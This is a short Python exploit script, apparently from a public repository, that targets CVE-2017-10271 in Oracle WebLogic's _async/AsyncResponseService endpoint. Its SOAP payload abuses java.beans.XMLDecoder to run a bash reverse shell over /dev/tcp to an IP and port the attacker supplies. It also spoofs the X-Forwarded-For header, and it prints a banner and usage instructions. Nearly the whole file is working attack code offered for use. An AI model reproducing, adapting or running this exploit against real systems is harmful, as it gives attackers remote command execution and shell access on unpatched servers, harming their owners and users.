cve-2017-10271/async_reserve_shell.py

#coding=utf-8
#author: jas502n
import sys
import requests

url = sys.argv[1]
# "http://10.10.20.166:7001/_async/AsyncResponseService"
ip = sys.argv[2]
port = sys.argv[3]

print '''
  ____                             
 |  _ \                            
 | |_) |_   _ _ __   __ _ ___ ___  
 |  _ <| | | | '_ \ / _` / __/ __| 
 | |_) | |_| | |_) | (_| \__ \__ \ 
 |____/ \__, | .__/ \__,_|___/___/ 
         __/ | |                   
        |___/|_|   By jas502n                  
            
      No Pactch  For  CVE-2017-10271        

     _async/AsyncResponseService RCE   

'''

print ">>>> usage: python test.py url reserve_ip reserve_port \n"
payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\r\n      <void class=\"java.lang.ProcessBuilder\">\r\n        <array class=\"java.lang.String\" length=\"3\">\r\n          <void index=\"0\">\r\n            <string>/bin/bash</string>\r\n          </void>\r\n          <void index=\"1\">\r\n            <string>-c</string>\r\n          </void>\r\n          <void index=\"2\">\r\n            <string>bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1</string>\r\n          </void>\r\n        </array>\r\n        <void method=\"start\"/></void>\r\n    </java>\r\n</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>" % (ip,port)
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'Accept-Language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    'Accept-Encoding': "gzip, deflate",
    'X-Forwarded-For': "127.0.0.2",
    'Connection': "close",
    'Upgrade-Insecure-Requests': "1",
    'Content-Type': "text/xml",
    'Content-Length': "963",
    'cache-control': "no-cache"
    }

response = requests.request("POST", url, data=payload, headers=headers)


print "status_code:%s" % str(response.status_code)
print(response.text)
